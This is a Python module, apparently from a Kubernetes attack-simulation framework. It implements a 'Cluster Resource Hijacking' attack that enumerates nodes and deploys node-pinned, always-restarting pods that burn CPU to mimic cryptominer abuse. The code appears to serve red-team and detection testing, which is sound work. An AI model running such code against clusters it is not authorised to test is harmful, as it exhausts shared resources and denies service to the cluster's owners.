import asyncio
from kubernetes import client
from kubernetes.client.rest import ApiException
from .base import BaseAttack, AttackSeverity


class ResourceHijacking(BaseAttack):
    @property
    def name(self):
        return "Cluster Resource Hijacking"

    @property
    def description(self):
        return "Deploys resource-intensive pods across available nodes to simulate cryptominer-style resource hijacking and node resource exhaustion."

    @property
    def severity(self):
        return AttackSeverity.HIGH

    @property
    def mitre_tactic(self):
        return "impact"

    @property
    def mitre_techniques(self):
        return [{"id": "T1496", "name": "Resource Hijacking"}, {"id": "T1499", "name": "Endpoint Denial of Service"}]

    async def execute(self):
        api = self._get_core_api()
        namespace = "default"

        self.emit_event_sync("info", "Starting resource hijacking simulation", {})

        try:
            nodes = api.list_node()
            available_nodes = [n.metadata.name for n in nodes.items]
            self.cmd_event_sync(
                "kubectl get nodes",
                "\n".join(available_nodes),
                f"Discovered {len(available_nodes)} target nodes"
            )
            self.emit_event_sync("info", f"Discovered {len(available_nodes)} nodes for resource targeting", {
                "nodes": available_nodes,
            })
        except ApiException as e:
            self.emit_event_sync("error", f"Failed to list nodes: {e}", {})
            available_nodes = []

        pod_count = max(len(available_nodes) * 2, 2)
        deployed_pods = []

        for i in range(pod_count):
            pod_name = f"resource-hijacker-{i}"
            node_affinity = None
            if available_nodes and i < len(available_nodes):
                node_affinity = {
                    "nodeAffinity": {
                        "requiredDuringSchedulingIgnoredDuringExecution": {
                            "nodeSelectorTerms": [{
                                "matchExpressions": [{
                                    "key": "kubernetes.io/hostname",
                                    "operator": "In",
                                    "values": [available_nodes[i % len(available_nodes)]],
                                }]
                            }]
                        }
                    }
                }

            pod_manifest = {
                "apiVersion": "v1",
                "kind": "Pod",
                "metadata": {
                    "name": pod_name,
                    "labels": {"app": "resource-hijacker", "attack": "resource-hijack"},
                },
                "spec": {
                    "containers": [{
                        "name": "loader",
                        "image": "alpine:3.19",
                        "command": [
                            "sh", "-c",
                            "echo 'Simulating compute load'; "
                            "c=0; while true; do "
                            "c=$((c+1)); "
                            "dd if=/dev/zero of=/dev/null bs=1M count=100 2>/dev/null; "
                            "sleep 0.1; "
                            "done"
                        ],
                        "resources": {
                            "requests": {"cpu": "500m", "memory": "256Mi"},
                            "limits": {"cpu": "1000m", "memory": "512Mi"},
                        },
                    }],
                    "restartPolicy": "Always",
                    "affinity": node_affinity,
                },
            }

            try:
                api.delete_namespaced_pod(pod_name, namespace)
                await asyncio.sleep(0.5)
            except ApiException:
                pass

            try:
                resp = api.create_namespaced_pod(namespace, pod_manifest)
                deployed_pods.append(pod_name)
                target_node = resp.spec.node_name or "unscheduled"
                pod_yaml = (
                    f"apiVersion: v1\nkind: Pod\nmetadata:\n  name: {pod_name}\n  namespace: {namespace}\n"
                    f"spec:\n  containers:\n  - name: loader\n    image: alpine:3.19\n"
                    f"    command: ['sh','-c','c=0; while true; do c=$((c+1)); dd if=/dev/zero of=/dev/null bs=1M count=100 2>/dev/null; sleep 0.1; done']\n"
                    f"    resources:\n      requests: {{cpu: 500m, memory: 256Mi}}\n      limits: {{cpu: 1000m, memory: 512Mi}}"
                )
                self.cmd_event_sync(
                    f"kubectl apply -f - <<EOF\n{pod_yaml}\nEOF",
                    f"pod/{pod_name} created",
                    f"Resource hijacker deployed: {pod_name}"
                )
                self.emit_event_sync("warning", f"Resource hijacker pod deployed: {pod_name} on {target_node}", {
                    "pod_name": pod_name,
                    "node": target_node,
                    "cpu_limit": "1000m",
                    "memory_limit": "512Mi",
                })
                self.add_infrastructure_sync("pod", pod_name, namespace, {
                    "type": "compute_hijacker",
                    "target_node": target_node,
                    "resources": {"cpu": "1000m", "memory": "512Mi"},
                })
            except ApiException as e:
                if e.status == 403:
                    self.emit_event_sync("detected", f"Pod creation denied by RBAC for {pod_name}", {})
                else:
                    self.emit_event_sync("error", f"Failed to create {pod_name}: {e}", {})

            await asyncio.sleep(1)

        self.emit_event_sync("complete", f"Resource hijacking complete. Deployed {len(deployed_pods)} compute pods.", {
            "pods_deployed": len(deployed_pods),
            "total_cpu_requests": f"{len(deployed_pods) * 500}m",
            "total_memory_requests": f"{len(deployed_pods) * 256}Mi",
            "cleanup_cmd": f"kubectl delete pods -l attack=resource-hijack -n {namespace}",
        })
